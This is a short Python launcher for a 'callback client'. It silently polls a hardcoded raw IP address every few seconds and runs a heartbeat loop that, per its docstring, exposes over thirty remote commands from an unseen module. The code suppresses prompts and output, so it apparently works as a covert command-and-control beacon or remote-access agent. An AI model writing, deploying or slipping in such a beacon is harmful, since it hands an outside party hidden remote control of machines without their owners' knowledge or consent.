"""
Standalone Callback Client - Full version with all commands
Uses the main ClientCallback class to get all 30+ commands
"""
import asyncio
import os
import sys
from client_callback import ClientCallback
from colorama import init

# Initialize colorama for Windows
init()

async def run_callback():
    """Run callback in standalone mode"""
    # Get admin URL - auto-use default, no prompts
    admin_url = os.environ.get("ADMIN_CALLBACK_URL") or os.environ.get("ADMIN_URL") or "http://31.97.100.192"

    # Get interval - auto-use default, no prompts
    interval = int(os.environ.get("ADMIN_CALLBACK_INTERVAL", "3"))

    # Create callback client (with ALL commands from client_callback.py)
    callback = ClientCallback(
        admin_url=admin_url,
        interval=interval,
        quiet=True  # Run silently
    )

    # Run the heartbeat loop directly
    if callback.enabled:
        await callback.heartbeat_loop()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_callback())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
